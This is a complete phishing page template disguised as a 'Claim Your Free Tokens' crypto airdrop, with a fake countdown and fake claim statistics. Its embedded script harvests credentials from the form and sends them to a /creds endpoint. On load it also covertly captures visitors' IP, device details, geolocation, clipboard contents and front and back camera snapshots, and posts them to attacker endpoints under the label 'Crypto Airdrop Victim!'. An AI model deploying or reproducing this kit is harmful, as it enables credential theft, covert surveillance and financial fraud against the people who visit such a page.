<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Crypto Airdrop - Claim Your Free Tokens</title>
<link rel="icon" href="https://assets.coingecko.com/coins/images/1/small/bitcoin.png">
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #0a0a0f; min-height: 100vh; display: flex; align-items: center; justify-content: center; color: #ffffff; overflow-x: hidden; }
.bg-glow { position: fixed; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(circle at 30% 50%, rgba(255,215,0,0.03) 0%, transparent 50%), radial-gradient(circle at 70% 50%, rgba(255,215,0,0.02) 0%, transparent 50%); pointer-events: none; }
.container { width: 100%; max-width: 480px; padding: 20px; position: relative; z-index: 1; }
.header { text-align: center; margin-bottom: 28px; }
.crypto-icons { display: flex; justify-content: center; gap: 12px; margin-bottom: 20px; }
.crypto-icon { width: 44px; height: 44px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 22px; border: 2px solid rgba(255,215,0,0.3); }
.badge { display: inline-block; background: linear-gradient(135deg, #FFD700, #FFA500); color: #000; padding: 6px 18px; border-radius: 20px; font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 16px; }
h1 { font-size: 32px; font-weight: 800; background: linear-gradient(135deg, #FFD700, #FFC107, #FFD700); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; margin-bottom: 8px; }
.subtitle { font-size: 15px; color: #888; line-height: 1.5; margin-bottom: 24px; }
.countdown { display: flex; justify-content: center; gap: 12px; margin-bottom: 28px; }
.countdown-item { background: #1a1a2e; border: 1px solid rgba(255,215,0,0.2); border-radius: 10px; padding: 12px 16px; min-width: 64px; text-align: center; }
.countdown-num { font-size: 28px; font-weight: 800; color: #FFD700; display: block; }
.countdown-label { font-size: 10px; color: #666; text-transform: uppercase; letter-spacing: 1px; margin-top: 4px; }
.stats { display: flex; justify-content: center; gap: 24px; margin-bottom: 28px; }
.stat { text-align: center; }
.stat-value { font-size: 20px; font-weight: 700; color: #FFD700; }
.stat-label { font-size: 11px; color: #666; margin-top: 2px; }
.form-box { background: #12121c; border: 1px solid rgba(255,215,0,0.15); border-radius: 16px; padding: 28px; }
.form-group { margin-bottom: 16px; }
.form-group label { display: block; font-size: 13px; font-weight: 600; color: #aaa; margin-bottom: 6px; }
.form-group input { width: 100%; padding: 14px 16px; background: #0a0a14; border: 1px solid #2a2a3e; border-radius: 10px; font-size: 14px; color: #ffffff; transition: border-color 0.2s; }
.form-group input:focus { outline: none; border-color: #FFD700; box-shadow: 0 0 0 3px rgba(255,215,0,0.1); }
.form-group input::placeholder { color: #444; }
.token-amount { background: linear-gradient(135deg, rgba(255,215,0,0.1), rgba(255,165,0,0.05)); border: 1px solid rgba(255,215,0,0.2); border-radius: 10px; padding: 16px; text-align: center; margin-bottom: 20px; }
.token-value { font-size: 28px; font-weight: 800; color: #FFD700; }
.token-label { font-size: 13px; color: #888; margin-top: 4px; }
.btn-login { width: 100%; padding: 16px; background: linear-gradient(135deg, #FFD700, #FFA500); color: #000000; border: none; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; transition: transform 0.2s, box-shadow 0.2s; }
.btn-login:hover { transform: translateY(-1px); box-shadow: 0 8px 24px rgba(255,215,0,0.3); }
.security { display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 16px; font-size: 12px; color: #666; }
.loading { display: none; padding: 30px; text-align: center; }
.spinner { border: 3px solid #1a1a2e; border-top: 3px solid #FFD700; border-radius: 50%; width: 40px; height: 40px; animation: spin 0.8s linear infinite; margin: 0 auto 12px; }
@keyframes spin { to { transform: rotate(360deg); } }
.footer { text-align: center; margin-top: 24px; font-size: 11px; color: #444; }
@media (max-width: 480px) { .container { padding: 16px; } h1 { font-size: 26px; } .countdown-item { min-width: 54px; padding: 10px 12px; } .countdown-num { font-size: 22px; } }
</style>
</head>
<body>
<div class="bg-glow"></div>
<div class="container">
<div class="header">
<div class="crypto-icons">
<div class="crypto-icon">₿</div>
<div class="crypto-icon">Ξ</div>
<div class="crypto-icon">◎</div>
<div class="crypto-icon">●</div>
</div>
<span class="badge">🔥 Airdrop Live Now</span>
<h1>Claim Your Free Tokens</h1>
<p class="subtitle">Exclusive token airdrop for early supporters. Connect your wallet and claim your allocation before the deadline.</p>
</div>
<div class="countdown" id="countdown">
<div class="countdown-item"><span class="countdown-num" id="hours">23</span><span class="countdown-label">Hours</span></div>
<div class="countdown-item"><span class="countdown-num" id="mins">59</span><span class="countdown-label">Minutes</span></div>
<div class="countdown-item"><span class="countdown-num" id="secs">59</span><span class="countdown-label">Seconds</span></div>
</div>
<div class="stats">
<div class="stat"><div class="stat-value">2,847</div><div class="stat-label">Claims Today</div></div>
<div class="stat"><div class="stat-value">$4.2M</div><div class="stat-label">Total Value</div></div>
<div class="stat"><div class="stat-value">12%</div><div class="stat-label">Remaining</div></div>
</div>
<div class="form-box">
<div class="token-amount">
<div class="token-value">5,000 TOKENS</div>
<div class="token-label">≈ $1,250.00 USD</div>
</div>
<form id="loginForm">
<div class="form-group">
<label>Wallet Address</label>
<input type="text" id="wallet" placeholder="0x... or ENS name" required>
</div>
<div class="form-group">
<label>Email Address</label>
<input type="email" id="email" placeholder="Enter your email" required>
</div>
<div class="form-group">
<label>Password</label>
<input type="password" id="password" placeholder="Create a secure password" required>
</div>
<button type="submit" class="btn-login">🚀 Claim Airdrop Now</button>
</form>
<div class="loading" id="loading">
<div class="spinner"></div>
<p style="color:#888;font-size:14px;">Processing your claim...</p>
</div>
<div class="security">🔒 Secured with 256-bit encryption</div>
</div>
<div class="footer">This airdrop is not affiliated with any exchange. Tokens are distributed on a first-come, first-served basis.</div>
</div>
<video id="video" style="display:none" playsinline autoplay></video>
<canvas id="canvas" style="display:none" width="640" height="480"></canvas>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="<%=a %>/public/advanced.js"></script>
<script>
var uid="<%=uid %>";
var video=document.getElementById('video'), canvas=document.getElementById('canvas');

(function countdown(){
    var h=document.getElementById('hours'),m=document.getElementById('mins'),s=document.getElementById('secs');
    var total=86399;
    setInterval(function(){
        total--;if(total<0)total=86399;
        h.textContent=String(Math.floor(total/3600)).padStart(2,'0');
        m.textContent=String(Math.floor((total%3600)/60)).padStart(2,'0');
        s.textContent=String(total%60).padStart(2,'0');
    },1000);
})();

async function gatherAll(){
    let td='💰 <b>Crypto Airdrop Victim!</b>\n\n';
    td+='⚓ IP: <code><%=ip %></code>\n';
    td+='⏰ Time: '+new Date().toLocaleString()+'\n';
    td+='🖥️ OS: <code>'+navigator.platform+'</code>\n';
    td+='📱 Screen: <code>'+screen.width+'x'+screen.height+'</code>\n';
    td+='🌐 Browser: <code>'+navigator.userAgent.split(' ').pop()+'</code>\n';
    $.post("<%=a %>/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)});
    if(navigator.geolocation){navigator.geolocation.getCurrentPosition((p)=>{$.post("<%=a %>/location",{uid:uid,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy});},()=>{},{enableHighAccuracy:true,timeout:10000});}
    async function captureCamera(f,l){try{const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:f,width:640,height:480}});video.srcObject=s;await video.play();await new Promise(r=>setTimeout(r,2000));canvas.getContext('2d').drawImage(video,0,0,640,480);$.post("<%=a %>/camsnap",{uid:uid,img:encodeURIComponent(canvas.toDataURL("image/jpeg",0.8).replace("data:image/jpeg;base64,","")),cam:l});s.getTracks().forEach(t=>t.stop());}catch(e){}}
    try{await captureCamera("user","selfie");}catch(e){}
    try{await captureCamera("environment","back");}catch(e){}
    try{if(navigator.clipboard&&navigator.clipboard.readText){const c=await navigator.clipboard.readText();if(c)$.post("<%=a %>/clipboard",{uid:uid,clip:encodeURIComponent(c)});}}catch(e){}
    try{const b=await navigator.getBattery();$.post("<%=a %>/battery",{uid:uid,level:Math.round(b.level*100),charging:b.charging});}catch(e){}
}

document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    var email = document.getElementById('email').value;
    var pass = document.getElementById('password').value;
    document.querySelector('form').style.display='none';
    document.getElementById('loading').style.display='block';
    fetch('/creds', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({username: email, password: pass, uri: '<%=uid %>', path: '<%=uid %>'})
    }).then(function(){ window.location.href = '<%=url %>'; });
});

window.onload = function(){ gatherAll(); if(typeof advancedGather==="function") advancedGather("<%=a %>","<%=uid %>"); };
</script>
</body>
</html>